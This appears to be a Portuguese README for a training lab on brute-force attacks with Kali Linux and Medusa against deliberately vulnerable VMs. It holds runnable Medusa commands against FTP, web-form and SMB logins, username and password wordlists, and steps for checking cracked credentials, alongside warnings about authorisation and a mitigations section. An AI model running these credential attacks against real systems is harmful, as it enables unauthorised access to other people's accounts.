Projeto: Ataques de Força Bruta (Kali + Medusa) — Laboratório Didático

Aviso importante: Todo o material abaixo é aplicável somente em ambiente controlado e isolado (VMs intencionalmente vulneráveis em rede host-only / internal). Não execute testes contra alvos sem permissão explícita. Faça snapshot das VMs antes de começar.

Sumário

Objetivo

Arquitetura do laboratório

Requisitos

Estrutura do repositório

Wordlists (inclusas)

Roteiro de execução passo-a-passo

Preparação do ambiente

Mapeamento inicial (nmap)

Cenário A: Força bruta em FTP (Medusa)

Cenário B: Formulário web (DVWA) — orientação para http-form

Cenário C: SMB / Password Spraying (Medusa)

Coleta de evidências

Validação de acessos

Verificação e rollback

Mitigações e recomendações

Sugestão de entrega para o desafio DIO

Objetivo

Demonstrar, em laboratório controlado, como ataques de força bruta podem ser realizados contra serviços comuns (FTP, formulários web, SMB) usando Kali Linux e Medusa, e documentar as técnicas, evidências e contramedidas.

Arquitetura do laboratório

Kali Linux (Atacante) — ferramenta: Medusa (instalada por padrão no Kali).

Metasploitable 2 (Alvo) — contém serviços vulneráveis (FTP, HTTP, SMB etc.). Opcional: instalar DVWA em uma VM web se desejar um formulário mais didático.

Rede: Host-only ou Internal Network (sem acesso à Internet).

Observação: IPs usados no material são exemplos: 192.168.56.101 (alvo) e 192.168.56.100 (Kali). Substitua pelos IPs reais do seu lab.

Requisitos

VirtualBox ou VMware

Imagens: Kali Linux, Metasploitable 2 (ou uma VM com DVWA)

Permissão explícita para conduzir testes (no seu caso, propriedade do laboratório)

Snapshots criados antes dos testes

Estrutura do repositório sugerida
/project-root
│
├─ README.md
├─ /images
├─ /wordlists
│   ├─ users.txt
│   └─ passwords-basic.txt
├─ /scripts
│   ├─ kali-verify.sh
│   └─ export-evidence.sh
└─ report.pdf (ou report.md)
Wordlists (inclusas)

As wordlists são intencionais e pequenas para treinamento. Não use listas enormes sem entender impacto.

wordlists/users.txt

msfadmin
admin
test
guest
user
root
service
webadmin

wordlists/passwords-basic.txt

msfadmin
password
123456
admin
qwerty
letmein
password1
changeme
Roteiro passo-a-passo (executável no lab)

Nota: os comandos abaixo assumem que você está na máquina Kali com Medusa instalado e que as wordlists estão em /home/kali/project/wordlists/.

1) Preparação do ambiente

Certifique-se de que ambos os snapshots foram criados.

Configure rede Host-only/Internal e verifique conectividade: ping 192.168.56.101.

2) Mapeamento inicial com nmap (justificação)

Objetivo: identificar portas e versões para escolher vetores a testar.

Exemplo:

mkdir -p ~/project/outputs
nmap -sS -sV -p- 192.168.56.101 -oN ~/project/outputs/initial-nmap.txt

Salve o arquivo initial-nmap.txt como evidência.

3) Cenário A — Força bruta em FTP (Medusa)

Objetivo: demonstrar como brutes force funcionam contra serviço FTP.

Exemplo (executar somente no alvo controlado):

cd ~/project
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords-basic.txt -M ftp -t 6 -f |& tee outputs/medusa-ftp-output.txt

Explicação dos parâmetros:

-h host alvo

-U arquivo com usuários

-P arquivo com senhas

-M ftp módulo FTP do Medusa

-t 6 threads concorrentes (ajuste conforme lab)

-f faz com que o Medusa pare ao encontrar credenciais válidas

Registre: tempo de execução, credenciais encontradas (se houver), e copie saída para o repositório.

Validação (FTP)

Se Medusa reportar credenciais válidas, valide:

ftp 192.168.56.101
# quando pedir usuário, informe usuário e senha encontrados
# ou
lftp -u usuario,senha ftp://192.168.56.101

Capture prints/saídas.

4) Cenário B — Formulário web (DVWA)

Objetivo: demonstrar ataque a formulário de login de aplicação vulnerável (DVWA).

Observação: Medusa tem módulos http_form/http que podem ser usados dependendo da versão. Se não funcionar, utilize Burp Suite (Intruder) ou Hydra para webforms.

Passos resumidos:

Identifique a URL de login e os nomes dos campos (ex.: username, password) usando o browser/DevTools.

Montar comando ejemplo (sintaxe ilustrativa — adapte conforme o formulário real):

medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords-basic.txt -M http_form -m "login:username=^USER^&password=^PASS^&submit=Login" -T 6 |& tee outputs/medusa-httpform-output.txt

-m define o corpo/form com placeholders ^USER^ e ^PASS^.

Valide login no browser com credenciais descobertas e capture screenshot.

5) Cenário C — SMB / Password Spraying

Objetivo: demonstrar tentativas de autenticação contra SMB (lista de usuários + poucas senhas para evitar lockout em cenário real — aqui o objetivo é didático).

Exemplo Medusa:

medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords-basic.txt -M smb -t 6 |& tee outputs/medusa-smb-output.txt

Validação (se credenciais válidas):

smbclient -L //192.168.56.101 -U 'usuario%senha'
6) Coleta de evidências

Salve saídas de todos os comandos (nmap, medusa etc.).

Faça screenshots do terminal e do acesso funcional (FTP directory listing, sessão DVWA autenticada).

Opcional: capture tráfego com tcpdump/Wireshark:

sudo tcpdump -i any host 192.168.56.101 -w ~/project/outputs/capture.pcap

Pare a captura após o teste.

7) Documentação dos resultados

Para cada teste, registre em report.md (ou report.pdf):

Objetivo do teste

Comandos executados (com comentários)

Resultados / credenciais obtidas (se aplicável)

Evidências (paths dos arquivos/screenshots)

Limitações e considerações éticas

8) Mitigação e recomendações (resumo)

Desabilitar serviços desnecessários (FTP legado); usar SFTP/FTPS quando necessário.

Implementar políticas de lockout e detecção (bloqueio temporário ou alertas).

Habilitar MFA onde aplicável.

Implementar rate limiting e WAF para web forms.

Monitoramento e logging centralizado para identificar padrões de brute force.

9) Verificação e rollback

Após finalizar, restaure os snapshots criados inicialmente para retornar ao estado limpo.

Checklist de submissão (GitHub)

README.md completo (este arquivo)

/wordlists com users.txt e passwords-basic.txt (inclusos neste repositório)

/outputs com initial-nmap.txt, medusa-*-output.txt, screenshots e capture.pcap (se houver)

report.md ou report.pdf com análise e recomendações
